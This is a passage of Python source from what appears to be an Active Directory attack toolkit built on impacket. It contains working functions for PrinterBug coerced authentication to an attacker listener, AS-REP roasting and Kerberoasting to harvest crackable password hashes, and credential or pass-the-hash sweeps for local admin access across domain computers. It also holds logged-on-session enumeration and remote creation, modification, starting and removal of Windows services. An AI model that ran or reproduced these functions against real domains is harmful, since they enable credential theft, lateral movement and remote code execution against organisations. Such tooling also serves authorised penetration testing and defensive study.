			logging.debug('[Invoke-PrinterBug] Got handle')
		
		request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
		request['hPrinter'] =  resp['pHandle']
		request['fdwFlags'] =  rprn.PRINTER_CHANGE_ADD_JOB
		request['pszLocalMachine'] =  '\\\\%s\x00' % listener
		request['pOptions'] =  NULL
		if self.args.stack_trace:
			request.dump()

		try:
			resp = dce.request(request)
		except Exception as e:
			entry['attributes']['Status'] = 'Might work?'
			entry['attributes']['Response'] = str(e)
			logging.debug('[Invoke-PrinterBug] %s' % (str(e)))
			return [entry]

		logging.debug('[Invoke-PrinterBug] Triggered RPC backconnect, this may or may not have worked')
		logging.debug('[Invoke-PrinterBug] Disconnecting from %s' % (target))
		dce.disconnect()

		entry['attributes']['Status'] = 'Success'
		return [entry]

	def invoke_asreproast(self, identity=None, searchbase=None, args=None, no_cache=False):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache

		setattr(args, 'preauthnotrequired', True)
		users = self.get_domainuser(
			identity=identity,
			searchbase=searchbase,
			no_cache=no_cache,
			properties=['sAMAccountName', 'memberOf'],
			args=args
		)
		logging.debug("[Invoke-ASREPRoast] Found %d users with preauthnotrequired enabled" % (len(users)))

		entries = []
		for user in users:
			samaccountname = user.get("attributes").get("sAMAccountName")
			if not samaccountname:
				logging.debug("[Invoke-ASREPRoast] No sAMAccountName found for %s" % (user.get("attributes").get("dn")))
				continue
			asreproast = ASREProast(self)
			ticket = asreproast.request(samaccountname)
			user['attributes']["Hash"] = ticket if ticket and 'attributes' in user.keys() else None
			entries.append(user)
		return entries

	def invoke_kerberoast(self, identity=None, target_domain=None, opsec=False, searchbase=None, args=None, no_cache=False):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		target_domain = args.server if hasattr(args, 'server') and args.server else target_domain
		opsec = args.opsec if hasattr(args, 'opsec') and args.opsec else opsec
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		setattr(args, 'spn', True)
		setattr(args, 'enabled', True)

		entries = self.get_domainuser(
			identity=identity,
			searchbase=searchbase,
			no_cache=no_cache,
			properties=['sAMAccountName', 'memberOf', 'servicePrincipalName'],
			args=args
		)
		if len(entries) == 0:
			logging.debug("[Invoke-Kerberoast] No identity found")
			return

		if target_domain:
			target_domain = args.server
		else:
			target_domain = self.domain

		kdc_options = None
		enctype = None
		if opsec:
			enctype = 18 # aes
			kdc_options = "0x40810000"

		userspn = GetUserSPNs(self.username, self.password, self.domain, target_domain, self.args, identity=args.identity, options=kdc_options, encType=enctype, TGT=self.conn.get_TGT())
		entries = userspn.run(entries)
		return entries

	def find_localadminaccess(self, computer=None, username=None, password=None, domain=None, nthash=None, lmhash=None, no_cache=False, no_resolve=False, args=None):
		import concurrent.futures
		host_entries = []
		computer = args.computer if hasattr(args, 'computer') and args.computer else computer
		no_resolve = args.no_resolve if hasattr(args, 'no_resolve') and args.no_resolve else no_resolve
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Find-LocalAdminAccess] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'hash') and args.hash:
				if ':' in args.hash:
					lmhash, nthash = args.hash.split(':')
				else:
					nthash = args.hash
			if lmhash is None and hasattr(args, 'lmhash') and args.lmhash:
				lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain

		if username and not (password or lmhash or nthash):
			logging.error("[Find-LocalAdminAccess] Password or hash is required when specifying a username")
			return

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		max_threads = 20
		def resolve_host(entry):
			try:
				if is_ipaddress(entry):
					return {'address': entry, 'hostname': entry}
				if not is_valid_fqdn(entry):
					entry = f"{entry}.{self.domain}"
				if no_resolve:
					logging.debug(f"[Find-LocalAdminAccess] Skipping hostname resolution for {entry}")
					ip = entry
				else:
					ip = host2ip(entry, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)
				
				return {
					'address': ip,
					'hostname': entry
				}
			except Exception:
				return None
		if computer:
			resolved = resolve_host(computer.lower())
			if resolved:
				host_entries.append(resolved)
		else:
			entries = self.get_domaincomputer(properties=['dnsHostName'], no_cache=no_cache)
			for entry in entries:
				dnshostname = entry.get('attributes', {}).get('dNSHostName', '').lower()
				if dnshostname:
					resolved = resolve_host(dnshostname)
					if resolved:
						host_entries.append(resolved)
		results = []
		def check_admin(ent):
			try:
				# Use provided creds if available, otherwise use current connection context
				current_username = username or self.conn.username
				current_password = password or self.conn.password
				current_domain = domain or self.conn.get_domain()
				current_lmhash = lmhash or self.conn.lmhash
				current_nthash = nthash or self.conn.nthash

				smbconn = self.conn.init_smb_session(
					ent['address'] if is_ipaddress(ent['address']) else ent['hostname'],
					username=current_username,
					password=current_password,
					domain=current_domain,
					lmhash=current_lmhash,
					nthash=current_nthash,
					show_exceptions=False
				)

				if not smbconn:
					logging.debug(f"[Find-LocalAdminAccess] Failed SMB connection to {ent['hostname']}")
					return None
					
				smbconn.connectTree("C$")
				return {
					'attributes': {
						'Address': ent['address'],
						'Hostname': ent['hostname'],
						'Username': current_username,
					}
				}
			except Exception as e:
				logging.debug(f"[Find-LocalAdminAccess] Failed to connect/check admin on {ent['hostname']}: {str(e)}")
				return None
		with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
			future_to_host = {executor.submit(check_admin, ent): ent for ent in host_entries}
			for future in concurrent.futures.as_completed(future_to_host):
				res = future.result()
				if res:
					results.append(res)
		return results

	def get_regloggedon(self, computer_name, port=445, args=None):
		entries = list()
		if is_ipaddress(computer_name) and self.use_kerberos:
			logging.error("[Get-NetLoggedOn] Use FQDN when using kerberos")
			return

		_rrp = RemoteOperations(
			connection = self.conn,
			port = port
		)
		dce = _rrp.connect(computer_name)

		if not dce:
			logging.error("[Get-RegLoggedOn] Failed to connect to %s" % (computer_name))
			return

		users = _rrp.query_logged_on(dce)
		logging.debug("[Get-RegLoggedOn] Found {} logged on user(s)".format(len(users)))
		for user_sid in users:
			entry = dict({
				"attributes": {
					"ComputerName": computer_name,
					"UserSID": None,
					"UserName": None,
					"UserDomain": None
				}
			})
			entry["attributes"]["UserSID"] = user_sid
			username = self.convertfrom_sid(user_sid)
			if username != user_sid:
				userdomain, username = username.split("\\")
				entry["attributes"]["UserDomain"] = userdomain
				entry["attributes"]["UserName"] = username
			entries.append(entry)

		return entries

	def get_netloggedon(self, computer_name, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Get-NetLoggedOn] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain

		if username and not (password or lmhash or nthash):
			logging.error("[Get-NetLoggedOn] Password or hash is required when specifying a username")
			return

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\wkssvc]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\wkssvc]', 'set_host': True},
		}

		computer_name = self._resolve_host(computer_name)
		if not computer_name:
			return

		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % computer_name
		
		# Call connectRPCTransport with all parameters - the method will use the current
		# user credentials for any parameters that are None or empty
		dce = self.conn.connectRPCTransport(
			host=computer_name,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			stringBindings=stringBinding,
			interface_uuid=wkst.MSRPC_UUID_WKST
		)
		
		if not dce:
			logging.error("[Get-NetLoggedOn] Failed to connect to %s" % (computer_name))
			return

		try:
			resp = wkst.hNetrWkstaUserEnum(dce,1)
		except Exception as e:
			if str(e).find('[Get-NetLoggedOn] Broken pipe') >= 0:
				# The connection timed-out. Let's try to bring it back next round
				logging.error('[Get-NetLoggedOn] Connection failed - skipping host!')
				return
			elif str(e).upper().find('ACCESS_DENIED'):
				# We're not admin, bye
				logging.error('[Get-NetLoggedOn] Access denied - you must be admin to enumerate sessions this way')
				dce.disconnect()
				return
			else:
				raise
		
		try:
			entries = []
			users = set()

			for i in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
				if i['wkui1_username'][-2] == '$':
					continue
				users.add((host2ip(computer_name, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver), i['wkui1_logon_domain'][:-1], i['wkui1_username'][:-1], i['wkui1_oth_domains'][:-1], i['wkui1_logon_server'][:-1]))
			for user in list(users):
				entries.append({
					"attributes": {
						"UserName": user[2],
						"LogonDomain": user[1],
						"AuthDomains": user[3],
						"LogonServer": user[4],
						"ComputerName": user[0],
					}
				})
		except IndexError:
			logging.info('[Get-NetLoggedOn] No sessions found!')

		dce.disconnect()
		return entries

	def get_netcomputerinfo(self,
		computer_name,
		username=None,
		password=None,
		domain=None,
		lmhash=None,
		nthash=None,
		port=445,
		args=None
	):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Get-NetComputerInfo] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain

		if username and not (password or lmhash or nthash):
			logging.error("[Get-ComputerInfo] Password or hash is required when specifying a username")
			return

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\wkssvc]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\wkssvc]', 'set_host': True},
		}

		computer_name = self._resolve_host(computer_name)
		if not computer_name:
			return

		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % computer_name
		
		dce = self.conn.connectRPCTransport(
			host=computer_name,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			stringBindings=stringBinding,
			interface_uuid=wkst.MSRPC_UUID_WKST
		)

		if not dce:
			logging.error("[Get-ComputerInfo] Failed to connect to %s" % (computer_name))
			return

		entries = []
		attributes = {}
		try:
			resp = wkst.hNetrWkstaGetInfo(dce, 100)
			attributes = {
				"ComputerName": resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1],
				"Langroup": resp['WkstaInfo']['WkstaInfo100']['wki100_langroup'][:-1],
				"VersionMajor": resp['WkstaInfo']['WkstaInfo100']['wki100_ver_major'],
				"VersionMinor": resp['WkstaInfo']['WkstaInfo100']['wki100_ver_minor'],
				"PlatformId": resp['WkstaInfo']['WkstaInfo100']['wki100_platform_id'],
				"WindowsVersion": resolve_windows_version(resp['WkstaInfo']['WkstaInfo100']['wki100_ver_major'], resp['WkstaInfo']['WkstaInfo100']['wki100_ver_minor']),
			}
		except Exception as e:
			if str(e).find('[Get-ComputerInfo] Broken pipe') >= 0:
				logging.error('[Get-ComputerInfo] Connection failed - skipping host!')
				return
			elif str(e).upper().find('ACCESS_DENIED'):
				logging.error('[Get-ComputerInfo] Access denied - you must be admin to enumerate sessions this way')
				dce.disconnect()
				return
			else:
				raise
		finally:
			dce.disconnect()

		try:
			dcom, wmi_conn = self.conn.init_wmi_session(computer_name)
			if not dcom or not wmi_conn:
				logging.warning(f"[Get-ComputerInfo] Failed to initialize WMI session for {computer_name}. Skipping and use RPC instead...")
			else:
				OperatingSystem = wmi_conn.ExecQuery('SELECT * from Win32_OperatingSystem')
				Processor = wmi_conn.ExecQuery('SELECT * from Win32_Processor')
				ComputerSystem = wmi_conn.ExecQuery('SELECT * from Win32_ComputerSystem')
				NetworkCard = wmi_conn.ExecQuery('SELECT * from Win32_NetworkAdapterConfiguration')
				while True:
					try:
						os_obj = OperatingSystem.Next(0xffffffff, 1)[0]
						processor_obj = Processor.Next(0xffffffff, 1)[0]
						computer_system_obj = ComputerSystem.Next(0xffffffff, 1)[0]
						network_card_obj = NetworkCard.Next(0xffffffff, 1)[0]
						os_props = dict(os_obj.getProperties())
						processor_props = dict(processor_obj.getProperties())
						computer_system_props = dict(computer_system_obj.getProperties())
						network_card_props = dict(network_card_obj.getProperties())
						name_split = os_props['Name']['value'].split('|') if 'Name' in os_props and os_props['Name']['value'] else ["", "", ""]
						attributes.update({
							"Host Name": os_props.get('CSName', {}).get('value', ''),
							"OS Name": os_props.get('Caption', {}).get('value', ''),
							"OS Version": os_props.get('Version', {}).get('value', '') + " Build " + os_props.get('BuildNumber', {}).get('value', ''),
							"OS Manufacturer": os_props.get('Manufacturer', {}).get('value', ''),
							"OS Configuration": '',
							"OS Build Type": os_props.get('BuildType', {}).get('value', ''),
							"Registered Owner": os_props.get('RegisteredUser', {}).get('value', ''),
							"Registered Organization": os_props.get('Organization', {}).get('value', ''),
							"Product ID": os_props.get('SerialNumber', {}).get('value', ''),
							"Original Install Date": wmi_time_to_str(os_props.get('InstallDate', {}).get('value', '')),
							"System Boot Time": wmi_time_to_str(os_props.get('LastBootUpTime', {}).get('value', '')),
							"System Manufacturer": computer_system_props.get('Manufacturer', {}).get('value', ''),
							"System Model": computer_system_props.get('Model', {}).get('value', ''),
							"System Type": os_props.get('OSArchitecture', {}).get('value', ''),
							"Processor(s)": processor_props.get('Name', {}).get('value', ''),
							"BIOS Version": os_props.get('Manufacturer', {}).get('value', '') + " " + os_props.get('Version', {}).get('value', ''),
							"Windows Directory": os_props.get('WindowsDirectory', {}).get('value', ''),
							"System Directory": os_props.get('SystemDirectory', {}).get('value', ''),
							"Boot Device": os_props.get('BootDevice', {}).get('value', ''),
							"System Locale": lcid_to_locale(os_props.get('Locale', {}).get('value', '')) or os_props.get('Locale', {}).get('value', ''),
							"Input Locale": lcid_to_locale(os_props.get('UserLocale', {}).get('value', '')) or os_props.get('UserLocale', {}).get('value', ''),
							"Time Zone": resolve_time_zone(os_props.get('CurrentTimeZone', {}).get('value', '')),
							"Total Physical Memory": "%s MB" % kb_to_mb_str(os_props.get('TotalVisibleMemorySize', {}).get('value', '')),
							"Available Physical Memory": "%s MB" % kb_to_mb_str(os_props.get('FreePhysicalMemory', {}).get('value', '')),
							"Virtual Memory: Max Size": "%s MB" % kb_to_mb_str(os_props.get('TotalVirtualMemorySize', {}).get('value', '')),
							"Virtual Memory: Available": "%s MB" % kb_to_mb_str(os_props.get('FreeVirtualMemory', {}).get('value', '')),
							"Virtual Memory: In Use": "%s MB" % kb_to_mb_str(os_props.get('TotalVirtualMemorySize', {}).get('value', '')),
							"Page File Location(s)": os_props.get('PageFile', {}).get('value', ''),
							"Domain": computer_system_props.get('Domain', {}).get('value', ''),
							"Logon Server": computer_system_props.get('Name', {}).get('value', ''),
							"Network Card(s)": network_card_props.get('Description', {}).get('value', ''),
						})
					except (IndexError, Exception) as e:
						from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError
						if isinstance(e, DCERPCSessionError):
							if hasattr(e, 'error_code') and e.error_code == 0x1:
								break
							elif hasattr(e, 'error_code') and e.error_code == 0x80041003:
								break
						if isinstance(e, IndexError):
							break
						else:
							raise
		except Exception as e:
			self.conn.disconnect_wmi_session()
			if self.args.stack_trace:
				raise

			if 'WBEM_E_ACCESS_DENIED' in str(e) or '0x80041003' in str(e):
				logging.warning(f"[Get-ComputerInfo] Access denied - you must be admin to enumerate sessions this way. Skipping...")
				return
			else:
				logging.error(f"[Get-ComputerInfo] WMI query failed: {e}")
		finally:
			self.conn.disconnect_wmi_session()

			entries.append({
			"attributes": attributes
		})

		return entries

	def get_netshare(self, args):
		host_inp = args.computer if hasattr(args, 'computer') and args.computer else getattr(args, 'computername', None)
		host = self._resolve_host(host_inp, getattr(args, 'server', None))

		if not host:
			logging.error(f"[Get-NetShare] Host not found")
			return

		client = self.conn.init_smb_session(host)

		if not client:
			logging.error("[Get-NetShare] Failed to connect to %s" % (host))
			return
		
		smbclient = SMBClient(client)
		shares = smbclient.shares()
		entries = []
		for i in range(len(shares)):
			entry = {
				"Name": None,
				"Remark": None,
				"Address": None,
			}
			entry["Name"] = shares[i]['shi1_netname'][:-1]
			entry["Remark"] = shares[i]['shi1_remark'][:-1]
			entry["Address"] = host
			entries.append(
				{
					"attributes": dict(entry)
				}
			)

		return entries

	def remove_netservice(self,
		computer_name,
		service_name,
		port=445
	):
		if not computer_name or not service_name:
			if self.args.stack_trace:
				raise ValueError("[Remove-NetService] Computer name, service name, and path are required")
			else:
				logging.error("[Remove-NetService] Computer name, service name, and path are required")
				return False

		service_name = service_name + '\x00' if service_name else NULL

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}

		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)

		if not dce:
			logging.error("[Set-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			logging.debug(f"[Remove-NetService] Opening service handle {service_name} on {computer_name}")
			resp = scmr.hROpenServiceW(dce, scManagerHandle, service_name)
			serviceHandle = resp['lpServiceHandle']

			scmr.hRDeleteService(dce, serviceHandle)
			logging.info(f"[Remove-NetService] Service {service_name} removed from {computer_name}")

			logging.debug(f"[Remove-NetService] Closing service handle {service_name} on {computer_name}")
			scmr.hRCloseServiceHandle(dce, scManagerHandle)
			dce.disconnect()
			return True
		except Exception as e:
			logging.error("[Remove-NetService] %s" % (str(e)))
			return False

	def stop_netservice(self,
		computer_name,
		service_name,
		port=445
	):
		if not computer_name or not service_name:
			if self.args.stack_trace:
				raise ValueError("[Stop-NetService] Computer name, service name, and path are required")
			else:
				logging.error("[Stop-NetService] Computer name, service name, and path are required")
				return False

		service_name = service_name + '\x00' if service_name else NULL

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}

		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)

		if not dce:
			logging.error("[Set-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			logging.debug(f"[Stop-NetService] Opening service handle {service_name} on {computer_name}")
			resp = scmr.hROpenServiceW(dce, scManagerHandle, service_name)
			serviceHandle = resp['lpServiceHandle']

			scmr.hRControlService(dce, serviceHandle, scmr.SERVICE_CONTROL_STOP)
			logging.info(f"[Stop-NetService] Service {service_name} stopped on {computer_name}")

			logging.debug(f"[Stop-NetService] Closing service handle {service_name} on {computer_name}")
			scmr.hRCloseServiceHandle(dce, serviceHandle)
			scmr.hRCloseServiceHandle(dce, scManagerHandle)
			dce.disconnect()
			return True
		except Exception as e:
			raise ValueError("[Stop-NetService] %s" % (str(e)))

	def start_netservice(self,
		computer_name,
		service_name,
		port=445
	):
		if not computer_name or not service_name:
			if self.args.stack_trace:
				raise ValueError("[Start-NetService] Computer name, service name, and path are required")
			else:
				logging.error("[Start-NetService] Computer name, service name, and path are required")
				return False

		service_name = service_name + '\x00' if service_name else NULL

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}

		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)

		if not dce:
			logging.error("[Set-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			logging.debug(f"[Start-NetService] Opening service handle {service_name} on {computer_name}")
			resp = scmr.hROpenServiceW(dce, scManagerHandle, service_name)
			serviceHandle = resp['lpServiceHandle']

			scmr.hRStartServiceW(dce, serviceHandle)
			logging.info(f"[Start-NetService] Service {service_name} started on {computer_name}")

			logging.debug(f"[Start-NetService] Closing service handle {service_name} on {computer_name}")
			scmr.hRCloseServiceHandle(dce, serviceHandle)
			scmr.hRCloseServiceHandle(dce, scManagerHandle)
			dce.disconnect()
			return True
		except Exception as e:
			raise ValueError("[Start-NetService] %s" % (str(e)))

	def add_netservice(self,
		computer_name,
		service_name,
		display_name,
		binary_path,
		service_type=None,
		start_type=None,
		delayed_start=False,
		error_control=None,
		service_start_name=None,
		password=None,
		port=445
	):

		if not computer_name or not service_name:
			if self.args.stack_trace:
				raise ValueError("[Add-NetService] Computer name, service name, and path are required")
			else:
				logging.error("[Add-NetService] Computer name, service name, and path are required")
				return False

		service_name = service_name + '\x00' if service_name else NULL
		display_name = display_name + '\x00' if display_name else NULL
		binary_path = binary_path + '\x00' if binary_path else NULL
		service_type = scmr.SERVICE_WIN32_OWN_PROCESS if service_type is None else int(service_type)
		start_type = scmr.SERVICE_AUTO_START if start_type is None else int(start_type)
		error_control = scmr.SERVICE_ERROR_IGNORE if error_control is None else int(error_control)
		service_start_name = service_start_name + '\x00' if service_start_name else NULL
		if password:
			client = self.conn.init_smb_session(computer_name)
			key = client.getSessionKey()
			try:
				password = (password+'\x00').encode('utf-16le')
			except UnicodeDecodeError:
				import sys
				password = (password+'\x00').decode(sys.getfilesystemencoding()).encode('utf-16le')
			password = encryptSecret(key, password)
		else:
			password = NULL

		if delayed_start and start_type != scmr.SERVICE_AUTO_START:
			logging.warning(f"[Add-NetService] Delayed start is only supported for auto-start services.")
			return False

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}

		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)

		if not dce:
			logging.error("[Set-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			resp = scmr.hRCreateServiceW(
				dce,
				scManagerHandle,
				service_name,
				display_name,
				dwServiceType=service_type,
				dwStartType=start_type,
				dwErrorControl=error_control,
				lpBinaryPathName=binary_path,
				lpServiceStartName=service_start_name,
				lpPassword=password
			)
			if resp['ErrorCode'] != 0:
				logging.error(f"[Add-NetService] Failed to add service {service_name} to {computer_name}: {resp['ErrorMessage']}")
				return False

			logging.info(f"[Add-NetService] Service {service_name} added to {computer_name}")

			if delayed_start:
				try:
					serviceHandle = resp['lpServiceHandle']
					request = scmr.RChangeServiceConfig2W()
					request['hService'] = serviceHandle
					request['Info']['dwInfoLevel'] = 3
					request['Info']['Union']['tag'] = 3
					request['Info']['Union']['psda']['fDelayedAutostart'] = 1
					resp = dce.request(request)
					
					if resp['ErrorCode'] != 0:
						logging.error(f"[Add-NetService] Failed to enable delayed auto-start for {service_name} on {computer_name}: {resp['ErrorMessage']}")

					logging.info(f"[Add-NetService] Enabled delayed auto-start for {service_name} on {computer_name}")
				except Exception as e:
					logging.error(f"[Add-NetService] {str(e)}")

			logging.debug(f"[Add-NetService] Closing service handle {service_name} on {computer_name}")
			scmr.hRCloseServiceHandle(dce, scManagerHandle)
			dce.disconnect()
			return True
		except Exception as e:
			raise ValueError("[Add-NetService] %s" % (str(e)))

	def set_netservice(self,
		computer_name,
		service_name,
		display_name=None,
		binary_path=None,
		service_type=None,
		start_type=None,
		delayed_start=False,
		error_control=None,
		service_start_name=None,
		password=None,
		port=445
	):
		if not computer_name or not service_name:
			if self.args.stack_trace:
				raise ValueError("[Set-NetService] Computer name, service name, and path are required")
			else:
				logging.error("[Set-NetService] Computer name, service name, and path are required")
				return False

		if delayed_start and start_type != scmr.SERVICE_AUTO_START:
			logging.warning(f"[Set-NetService] Delayed start is only supported for auto-start services.")
			return False

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}

		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)

		if not dce:
			logging.error("[Set-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			# Open service handle
			logging.debug(f"[Set-NetService] Opening service handle {service_name} on {computer_name}")
			resp = scmr.hROpenServiceW(dce, scManagerHandle, service_name + '\x00')
			serviceHandle = resp['lpServiceHandle']

			display = display_name + '\x00' if display_name else NULL
			binary_path = binary_path + '\x00' if binary_path else NULL
			service_type = scmr.SERVICE_NO_CHANGE if service_type is None else int(service_type)
			start_type = scmr.SERVICE_NO_CHANGE if start_type is None else int(start_type)
			delayed_start = delayed_start if delayed_start else False
			error_control = scmr.SERVICE_ERROR_IGNORE if error_control is None else int(error_control)
			service_start_name = service_start_name + '\x00' if service_start_name else NULL
			if password:
				client = self.conn.init_smb_session(computer_name)
				key = client.getSessionKey()
				try:
					password = (password+'\x00').encode('utf-16le')
				except UnicodeDecodeError:
					import sys
					password = (password+'\x00').decode(sys.getfilesystemencoding()).encode('utf-16le')
				password = encryptSecret(key, password)
			else:
				password = NULL

			logging.debug(f"[Set-NetService] Changing service config {service_name} on {computer_name}")

			scmr.hRChangeServiceConfigW(
				dce, 
				serviceHandle,
				service_type,
				start_type,
				error_control,
				binary_path,
				NULL,
				NULL,
				NULL,
				0,
				service_start_name,
				password,
				0,
				display
			)

			if delayed_start:
				try:
					request = scmr.RChangeServiceConfig2W()
					request['hService'] = serviceHandle
					request['Info']['dwInfoLevel'] = 3
					request['Info']['Union']['tag'] = 3
					request['Info']['Union']['psda']['fDelayedAutostart'] = 1
					resp = dce.request(request)
					
					if resp['ErrorCode'] != 0:
						logging.error(f"[Set-NetService] Failed to enable delayed auto-start for {service_name} on {computer_name}: {resp['ErrorMessage']}")

					logging.info(f"[Set-NetService] Enabled delayed auto-start for {service_name} on {computer_name}")
				except Exception as e:
					logging.error(f"[Set-NetService] {str(e)}")

			logging.info(f"[Set-NetService] Service config changed {service_name} on {computer_name}")

			logging.debug(f"[Set-NetService] Closing service handle {service_name} on {computer_name}")
			scmr.hRCloseServiceHandle(dce, serviceHandle)
			scmr.hRCloseServiceHandle(dce, scManagerHandle)
			dce.disconnect()

			return True
		except Exception as e:
			raise ValueError("[Set-NetService] %s" % (str(e)))

	def get_netservice(self,
		computer_name,
		port=445,
		name=None,
		is_running=None,
		is_stopped=None,
		raw=False
	):

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\svcctl]', 'set_host': True},
		}


		target = self._resolve_host(computer_name)
		if not target:
			return False
		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding)
		
		if not dce:
			logging.error("[Get-NetService] Failed to connect to %s" % (computer_name))
			return False

		dce.bind(scmr.MSRPC_UUID_SCMR)

		try:
			# open service handle
			res = scmr.hROpenSCManagerW(dce)
			scManagerHandle = res['lpScHandle']

			if name:
				ans = scmr.hROpenServiceW(dce, scManagerHandle, name + '\x00')
				serviceHandle = ans['lpServiceHandle']

				config = {}
				logging.debug(f"[Get-NetService] Querying service config for {name} on {computer_name}")
				resp = scmr.hRQueryServiceConfigW(dce, serviceHandle)
				config['attributes'] = {}
				config['attributes']['ServiceName'] = name
				config['attributes']['DisplayName'] = resp['lpServiceConfig']['lpDisplayName'][:-1]
				config['attributes']['StartType'] = SERVICE_START_TYPE(resp['lpServiceConfig']['dwStartType']).to_str() if not raw else resp['lpServiceConfig']['dwStartType']
				config['attributes']['ErrorControl'] = SERVICE_ERROR_CONTROL(resp['lpServiceConfig']['dwErrorControl']).to_str() if not raw else resp['lpServiceConfig']['dwErrorControl']
				config['attributes']['BinaryPath'] = resp['lpServiceConfig']['lpBinaryPathName'][:-1] if not raw else resp['lpServiceConfig']['lpBinaryPathName']
				config['attributes']['ServiceType'] = SERVICE_TYPE(resp['lpServiceConfig']['dwServiceType']).to_str() if not raw else resp['lpServiceConfig']['dwServiceType']
				config['attributes']['Dependencies'] = resp['lpServiceConfig']['lpDependencies'][:-1]
				config['attributes']['ServiceStartName'] = resp['lpServiceConfig']['lpServiceStartName'][:-1]

				logging.debug(f"[Get-NetService] Querying service status for {name} on {computer_name}")
				resp = scmr.hRQueryServiceStatus(dce, serviceHandle)
